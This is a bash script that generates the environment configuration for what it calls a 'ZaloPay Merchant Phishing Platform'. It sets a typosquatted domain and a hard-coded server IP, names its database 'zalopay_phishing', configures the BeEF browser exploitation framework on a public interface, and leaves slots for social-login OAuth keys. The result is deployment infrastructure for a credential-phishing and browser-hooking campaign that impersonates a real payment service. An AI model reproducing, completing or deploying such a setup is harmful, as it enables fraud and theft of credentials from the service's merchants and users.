#!/bin/bash

# ZaloPay Merchant Platform - Environment Setup Script
# Automatically generates a .env file with proper configuration

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo "========================================"
echo "ZaloPay Environment Configuration"
echo "========================================"
echo ""

# Check if .env already exists
if [ -f .env ]; then
    echo -e "${YELLOW}Warning: .env file already exists!${NC}"
    read -p "Do you want to backup and recreate it? (y/n): " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        BACKUP_FILE=".env.backup.$(date +%Y%m%d_%H%M%S)"
        mv .env "$BACKUP_FILE"
        echo -e "${GREEN}Backed up existing .env to ${BACKUP_FILE}${NC}"
    else
        echo "Keeping existing .env file"
        exit 0
    fi
fi

# Generate secure random strings
generate_random() {
    openssl rand -hex 32
}

# Domain configuration
DOMAIN="zalopaymerchan.com"
SERVER_IP="221.120.163.129"

echo -e "${BLUE}Generating secure credentials...${NC}"

# Generate secrets
JWT_SECRET=$(generate_random)
ENCRYPTION_KEY=$(generate_random)
MONGODB_ROOT_PASSWORD=$(generate_random | cut -c1-20)
REDIS_PASSWORD=$(generate_random | cut -c1-20)
BEEF_PASSWORD=$(generate_random | cut -c1-16)
BEEF_API_TOKEN=$(generate_random)

echo -e "${GREEN}✓ Generated secure credentials${NC}"
echo ""

# Create .env file
cat > .env << EOF
# ZaloPay Merchant Phishing Platform - Environment Configuration
# Auto-generated on $(date)
# Domain: ${DOMAIN}
# Server IP: ${SERVER_IP}

# ========================================
# DOMAIN CONFIGURATION
# ========================================
DOMAIN=${DOMAIN}
SERVER_IP=${SERVER_IP}

# ========================================
# DATABASE CONFIGURATION
# ========================================
# MongoDB Configuration
MONGODB_ROOT_USERNAME=admin
MONGODB_ROOT_PASSWORD=${MONGODB_ROOT_PASSWORD}
MONGODB_DATABASE=zalopay_phishing

# Redis Configuration
REDIS_PASSWORD=${REDIS_PASSWORD}

# ========================================
# INFLUXDB CONFIGURATION
# ========================================
INFLUXDB_ADMIN_USER=admin
INFLUXDB_ADMIN_PASSWORD=${REDIS_PASSWORD}
INFLUXDB_ORG=zalopay
INFLUXDB_BUCKET=metrics
INFLUXDB_TOKEN=${JWT_SECRET}

# ========================================
# SECURITY CONFIGURATION
# ========================================
# JWT Configuration
JWT_SECRET_KEY=${JWT_SECRET}

# Encryption Key (32+ characters)
ENCRYPTION_KEY=${ENCRYPTION_KEY}

# ========================================
# BEEF FRAMEWORK CONFIGURATION
# ========================================
BEEF_HOST=0.0.0.0
BEEF_PORT=3000
BEEF_USER=beef
BEEF_PASSWORD=${BEEF_PASSWORD}
BEEF_API_TOKEN=${BEEF_API_TOKEN}

# ========================================
# OAUTH CONFIGURATION (Update with your credentials)
# ========================================
# Google OAuth
GOOGLE_CLIENT_ID=YOUR_GOOGLE_CLIENT_ID_HERE
GOOGLE_CLIENT_SECRET=YOUR_GOOGLE_CLIENT_SECRET_HERE

# Apple OAuth
APPLE_CLIENT_ID=YOUR_APPLE_CLIENT_ID_HERE
APPLE_CLIENT_SECRET=YOUR_APPLE_CLIENT_SECRET_HERE

# Facebook OAuth
FACEBOOK_CLIENT_ID=YOUR_FACEBOOK_CLIENT_ID_HERE
FACEBOOK_CLIENT_SECRET=YOUR_FACEBOOK_CLIENT_SECRET_HERE

# ========================================
# SSL CONFIGURATION
# ========================================
# Email for SSL certificate registration
SSL_EMAIL=admin@${DOMAIN}

# ========================================
# MONITORING CONFIGURATION
# ========================================
# Alert Configuration
ALERT_EMAIL=admin@${DOMAIN}

# Slack Webhook for notifications (optional)
SLACK_WEBHOOK=https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK

# ========================================
# BACKUP CONFIGURATION
# ========================================
# Backup retention period in days
RETENTION_DAYS=30

# Backup compression level (1-9)
COMPRESS_LEVEL=6

# ========================================
# DEVELOPMENT SETTINGS
# ========================================
# Set to True for development, False for production
DEBUG=False

# Log level (DEBUG, INFO, WARNING, ERROR)
LOG_LEVEL=INFO

# ========================================
# PERFORMANCE SETTINGS
# ========================================
# Number of worker processes
WORKERS=4

# Maximum memory usage for Redis (MB)
REDIS_MAXMEMORY=512

# ========================================
# SECURITY SETTINGS
# ========================================
# Enable security headers
SECURITY_HEADERS=True

# Enable rate limiting
RATE_LIMITING=True

# Maximum login attempts per minute
MAX_LOGIN_ATTEMPTS=5

# ========================================
# NETWORK CONFIGURATION
# ========================================
# External port for HTTP (default: 80)
HTTP_PORT=80

# External port for HTTPS (default: 443)
HTTPS_PORT=443

# Internal port for backend API (default: 8000)
BACKEND_PORT=8000

# Internal port for BeEF (default: 3000)
BEEF_PORT=3000

# ========================================
# DOCKER SETTINGS
# ========================================
# Docker Compose project name
COMPOSE_PROJECT_NAME=zalopay

# Timezone for containers
TZ=Asia/Ho_Chi_Minh

# ========================================
# IMPORTANT NOTES
# ========================================
# 1. Never commit this file to version control
# 2. Update OAuth credentials before deployment
# 3. Regularly rotate encryption keys and passwords
# 4. Monitor logs for suspicious activity
# 5. Keep all software updated
EOF

echo -e "${GREEN}✓ Created .env file${NC}"
echo ""

# Create .env summary file (without sensitive data)
cat > .env.summary << EOF
ZaloPay Merchant Platform - Configuration Summary
Generated: $(date)

Domain Configuration:
  - Domain: ${DOMAIN}
  - Server IP: ${SERVER_IP}
  
Security:
  - JWT Secret: [Generated - 64 chars]
  - Encryption Key: [Generated - 64 chars]
  - MongoDB Password: [Generated - 20 chars]
  - Redis Password: [Generated - 20 chars]
  - BeEF Password: [Generated - 16 chars]

Database:
  - MongoDB: Configured with replica set
  - Redis: Configured with password protection
  - InfluxDB: Configured with token auth

OAuth:
  - Google: [NEEDS CONFIGURATION]
  - Apple: [NEEDS CONFIGURATION]
  - Facebook: [NEEDS CONFIGURATION]

Next Steps:
  1. Update OAuth credentials in .env
  2. Verify domain DNS points to ${SERVER_IP}
  3. Run: ./scripts/configure_deployment.sh
  4. Run: docker compose build
  5. Run: docker compose up -d
EOF

echo -e "${GREEN}✓ Created .env.summary${NC}"
echo ""

# Display important information
echo -e "${BLUE}========================================"
echo "Configuration Summary"
echo "========================================${NC}"
echo ""
echo -e "Domain: ${GREEN}${DOMAIN}${NC}"
echo -e "Server IP: ${GREEN}${SERVER_IP}${NC}"
echo ""
echo -e "${YELLOW}Generated Credentials:${NC}"
echo "  - JWT Secret: ✓ Generated (64 chars)"
echo "  - Encryption Key: ✓ Generated (64 chars)"
echo "  - MongoDB Password: ✓ Generated (20 chars)"
echo "  - Redis Password: ✓ Generated (20 chars)"
echo "  - BeEF Password: ✓ Generated (16 chars)"
echo ""
echo -e "${YELLOW}Action Required:${NC}"
echo "  1. Update OAuth credentials in .env file:"
echo "     - GOOGLE_CLIENT_ID"
echo "     - GOOGLE_CLIENT_SECRET"
echo "     - APPLE_CLIENT_ID"
echo "     - APPLE_CLIENT_SECRET"
echo "     - FACEBOOK_CLIENT_ID"
echo "     - FACEBOOK_CLIENT_SECRET"
echo ""
echo "  2. Verify DNS configuration:"
echo "     dig ${DOMAIN} +short"
echo "     (Should return: ${SERVER_IP})"
echo ""
echo "  3. Review and customize .env as needed"
echo ""
echo -e "${GREEN}✓ Environment configuration complete!${NC}"
echo ""
echo "Files created:"
echo "  - .env (Sensitive - DO NOT COMMIT)"
echo "  - .env.summary (Safe to share)"
echo ""

# Update .gitignore to ensure .env is not committed
if ! grep -q "^.env$" .gitignore 2>/dev/null; then
    echo ".env" >> .gitignore
    echo -e "${GREEN}✓ Added .env to .gitignore${NC}"
fi

echo -e "${BLUE}Next commands:${NC}"
echo "  ./scripts/configure_deployment.sh"
echo "  docker compose build"
echo "  docker compose up -d"
echo ""
